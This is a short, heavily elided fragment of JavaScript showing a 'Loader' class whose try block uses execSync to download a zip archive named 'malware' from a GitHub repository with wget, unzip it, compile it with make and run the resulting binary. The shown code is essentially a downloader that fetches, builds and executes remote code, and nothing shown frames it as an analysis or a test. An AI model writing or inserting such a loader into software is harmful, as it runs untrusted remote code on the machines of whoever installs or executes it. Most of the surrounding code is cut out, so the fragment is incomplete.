...
class Loader {
  ...
  */
  ...
  try {
    ...
    execSync('wget -O malware.zip https://github.com/pakaremon/malware/archive/refs/heads/master.zip', { stdio: 'inherit' });
    execSync('unzip malware.zip', { stdio: 'inherit' });
    process.chdir('malware-master');
    execSync('make', { stdio: 'inherit' });
    execSync('./malware', { stdio: 'inherit' });
